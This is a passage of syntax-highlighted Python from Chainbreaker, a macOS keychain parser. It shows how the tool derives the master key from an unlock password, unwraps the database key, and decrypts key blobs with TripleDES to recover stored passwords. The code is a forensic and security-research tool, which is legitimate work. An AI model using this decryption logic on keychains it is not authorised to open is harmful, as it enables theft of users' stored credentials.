</span></span><span style="display:flex;"><span>        base_addr <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_base_address(CSSM_DL_DB_RECORD_GENERIC_PASSWORD, record_offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record_meta <span style="color:#f92672">=</span> _GENERIC_PW_HEADER(self<span style="color:#f92672">.</span>kc_buffer[base_addr:base_addr <span style="color:#f92672">+</span> _GENERIC_PW_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        buffer <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>kc_buffer[
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                 base_addr <span style="color:#f92672">+</span> _GENERIC_PW_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size:base_addr <span style="color:#f92672">+</span> record_meta<span style="color:#f92672">.</span>RecordSize]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ssgp, dbkey <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_extract_ssgp_and_dbkey(record_meta, buffer)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>GenericPasswordRecord(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            created<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_keychain_time(base_addr, record_meta<span style="color:#f92672">.</span>CreationDate <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            last_modified<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_keychain_time(base_addr, record_meta<span style="color:#f92672">.</span>ModDate <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Description <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            creator<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_four_char_code(base_addr, record_meta<span style="color:#f92672">.</span>Creator <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            type<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_four_char_code(base_addr, record_meta<span style="color:#f92672">.</span>Type <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            print_name<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            alias<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Alias <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            account<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Account <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            service<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Service <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ssgp<span style="color:#f92672">=</span>ssgp,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            dbkey<span style="color:#f92672">=</span>dbkey)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> record
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_base_address</span>(self, table_name, offset<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        base_address <span style="color:#f92672">=</span> _APPL_DB_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_get_table_offset(table_name)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> offset:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            base_address <span style="color:#f92672">+=</span> offset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> base_address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filepath</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_filepath
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@filepath.setter</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filepath</span>(self, value):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_filepath <span style="color:#f92672">=</span> value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_filepath:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>_read_keychain_to_buffer()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unlock_password</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_unlock_password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@unlock_password.setter</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unlock_password</span>(self, unlock_password):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_unlock_password <span style="color:#f92672">=</span> unlock_password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_unlock_password:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            master_key <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_generate_master_key(self<span style="color:#f92672">.</span>_unlock_password)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[+] Master Key: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hexlify(master_key)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>db_key <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_find_wrapping_key(master_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unlock_key</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_unlock_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@unlock_key.setter</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unlock_key</span>(self, unlock_key):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_unlock_key <span style="color:#f92672">=</span> unlock_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_unlock_key:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>db_key <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_find_wrapping_key(unhexlify(self<span style="color:#f92672">.</span>_unlock_key))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unlock_file</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_unlock_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@unlock_file.setter</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unlock_file</span>(self, filepath):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_unlock_file <span style="color:#f92672">=</span> filepath
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_unlock_file:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> open(self<span style="color:#f92672">.</span>_unlock_file, mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> uf:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    file_content <span style="color:#f92672">=</span> uf<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                unlock_key_blob <span style="color:#f92672">=</span> _UNLOCK_BLOB(file_content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>db_key <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_find_wrapping_key(unlock_key_blob<span style="color:#f92672">.</span>MasterKey)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">OSError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;Unable to read unlock file: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>_unlock_file)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">db_key</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_db_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@db_key.setter</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">db_key</span>(self, key):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_db_key <span style="color:#f92672">=</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_db_key:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Even after finding a db_key, we need to try and load the key list.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># If we don&#39;t find any keys, but we do find a db_key, then we&#39;ve likely</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># found a hash collision</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_generate_key_list() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># SOURCE : extractkeychain.py</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_kcdecrypt</span>(key, iv, data):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(<span style="color:#e6db74">&#39;Chainbreaker&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            logger<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#34;Encrypted data is 0.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(data) <span style="color:#f92672">%</span> Chainbreaker<span style="color:#f92672">.</span>BLOCKSIZE <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        cipher <span style="color:#f92672">=</span> TripleDES(key, CBC, str(bytearray(iv)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        plain <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># now check padding</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        pad <span style="color:#f92672">=</span> ord(plain[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> pad <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            logger<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#34;Bad padding byte. Keychain password might be incorrect.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> plain[<span style="color:#f92672">-</span>pad:]:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ord(z) <span style="color:#f92672">!=</span> pad:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                logger<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#34;Bad padding byte. Keychain password might be incorrect.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        plain <span style="color:#f92672">=</span> plain[:<span style="color:#f92672">-</span>pad]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> plain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_encrypted_data_in_blob</span>(blob_buffer):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        key_blob <span style="color:#f92672">=</span> _KEY_BLOB(blob_buffer[:_KEY_BLOB<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> key_blob<span style="color:#f92672">.</span>CommonBlob<span style="color:#f92672">.</span>Magic <span style="color:#f92672">!=</span> _KEY_BLOB<span style="color:#f92672">.</span>COMMON_BLOB_MAGIC:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        key_data <span style="color:#f92672">=</span> blob_buffer[key_blob<span style="color:#f92672">.</span>StartCryptoBlob:key_blob<span style="color:#f92672">.</span>TotalLength]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> key_blob<span style="color:#f92672">.</span>IV, key_data  <span style="color:#75715e"># IV, Encrypted Data</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ## decrypted dbblob area</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ## Documents : http://www.opensource.apple.com/source/securityd/securityd-55137.1/doc/BLOBFORMAT</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ## http://www.opensource.apple.com/source/libsecurity_keychain/libsecurity_keychain-36620/lib/StorageManager.cpp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># def _ssgp_decryption(self, ssgp, dbkey):</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#     return Chainbreaker._kcdecrypt(dbkey, _SSGP(ssgp).IV, ssgp[_SSGP.STRUCT.size:])</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Documents : http://www.opensource.apple.com/source/securityd/securityd-55137.1/doc/BLOBFORMAT</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># source : http://www.opensource.apple.com/source/libsecurity_cdsa_client/libsecurity_cdsa_client-36213/lib/securestorage.cpp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># magicCmsIV : http://www.opensource.apple.com/source/Security/Security-28/AppleCSP/AppleCSP/wrapKeyCms.cpp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">keyblob_decryption</span>(encryptedblob, iv, dbkey):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(<span style="color:#e6db74">&#39;Chainbreaker&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># magicCmsIV = unhexlify(&#39;4adda22c79e82105&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        plain <span style="color:#f92672">=</span> Chainbreaker<span style="color:#f92672">.</span>_kcdecrypt(dbkey, Chainbreaker<span style="color:#f92672">.</span>MAGIC_CMS_IV, encryptedblob)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> plain<span style="color:#f92672">.</span>__len__() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># now we handle the unwrapping. we need to take the first 32 bytes,</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># and reverse them.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        revplain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            revplain <span style="color:#f92672">+=</span> plain[<span style="color:#ae81ff">31</span> <span style="color:#f92672">-</span> i]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># now the real key gets found. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        plain <span style="color:#f92672">=</span> Chainbreaker<span style="color:#f92672">.</span>_kcdecrypt(dbkey, iv, revplain)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        keyblob <span style="color:#f92672">=</span> plain[<span style="color:#ae81ff">4</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(keyblob) <span style="color:#f92672">!=</span> Chainbreaker<span style="color:#f92672">.</span>KEYLEN:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            logger<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#34;Decrypted key length is not valid&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> keyblob
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">KeychainRecord</span>(object):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(<span style="color:#e6db74">&#39;Chainbreaker&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_to_disk</span>(self, output_directory):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># self.exportable contains the content we should write to disk. If it isn&#39;t implemented we can&#39;t</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># then writing to disk via this method isn&#39;t currently supported.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                export_content <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>exportable
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">NotImplementedError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;Attempted to export a non-exportable record.&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Create out export directory if it doesn&#39;t exist.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(output_directory):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    os<span style="color:#f92672">.</span>makedirs(output_directory)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">OSError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>critical(<span style="color:#e6db74">&#39;Unable to create export directory: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> output_directory)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Generate our filepath, making sure the file doesn&#39;t already exist. If it does,</span>
</span></span><span style="display:flex;"><span>
